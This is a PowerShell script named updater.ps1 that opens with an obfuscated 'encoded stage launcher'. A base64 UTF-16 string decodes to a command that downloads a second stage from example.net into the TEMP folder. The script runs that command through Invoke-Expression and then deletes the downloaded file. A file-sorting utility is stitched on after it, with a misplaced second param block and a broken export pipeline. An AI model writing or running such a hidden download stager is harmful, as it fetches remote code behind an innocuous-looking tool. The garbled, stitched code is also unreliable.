<#
.SYNOPSIS
    Encoded stage launcher.

.DESCRIPTION
    Reassembles a base64 stage, decodes it as UTF-16 and
    invokes the resulting text in the current session.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [int]$TimeoutSec = 71
)
$EncodedStage = (
    'JABTAHQAYQBnAGUAMgBVAHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAu' +
    'AG4AZQB0AC8AdQBwAGQAYQB0AGUALgBkAGEAdAAiADsAIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIA' +
    "ZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJABTAHQAYQBnAGUAMgBVAHIAbAAgAC0ATwB1AHQARgBp" +
    "AGwAZQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABzAHQAYQBnAGUAMgAuAGIAaQBuACIAIAAtAFUA" +
    "cwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnAA=="
)
$PayloadText = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedStage))
try {
    Write-Verbose ("Decoded stage length: " + $PayloadText.Length)
    if ([string]::IsNullOrWhiteSpace($PayloadText)) {
        throw "Decoded stage was empty"
    }
    Invoke-Expression $PayloadText
}
catch {
    Write-Warning "Encoded stage failed: $($_.Exception.Message)"
}

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$SourcePath = 'D:\Dropbox\Incoming',
    [string]$DestinationRoot = "D:\Archive\Sorted",
    [string]$LogPath = 'C:\Logs\organise-2026-01-04.log',

    [switch]$DryRun
)
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-StrictMode -Version 2.0
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$map = @{
    '.pdf'  = 'Documents'
    '.docx' = 'Documents'
    '.xlsx' = 'Spreadsheets'
    '.png'  = 'Images'
    '.jpg'  = 'Images'
    '.zip'  = 'Archives'
    '.log'  = 'Logs'
}

$files = Get-ChildItem -LiteralPath $SourcePath -File -Force |
    Where-Object { $map.ContainsKey($_.Extension.ToLower()) }
$moved = @()
foreach ($file in $files) {
    $folder = Join-Path $DestinationRoot $map[$file.Extension.ToLower()]
    if (-not (Test-Path -LiteralPath $folder)) {
        New-Item -ItemType Directory -Path $folder -Force | Out-Null
    }
    $target = Join-Path $folder $file.Name
    if (Test-Path -LiteralPath $target) {
        $stamp = Get-Date -Format 'yyyyMMddHHmmss'
        $target = Join-Path $folder ([System.IO.Path]::GetFileNameWithoutExtension($file.Name) + '-' + $stamp + $file.Extension)
    }
    Move-Item -LiteralPath $file.FullName -Destination $target -WhatIf:$DryRun
    $moved += [pscustomobject]@{
        Source  = $file.FullName
        Target  = $target
        MovedAt = Get-Date
    }
}

$byFolder = $moved | Group-Object -Property { Split-Path -Parent $_.Target } |
    Select-Object Name, Count
$byFolder | Format-Table -AutoSize
Write-Host ("Moved {0} files" -f @($moved).Count) -ForegroundColor Green
$moved |
    -NoTypeInformation `
    -Path $LogPath.Replace('.log', '.csv')

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
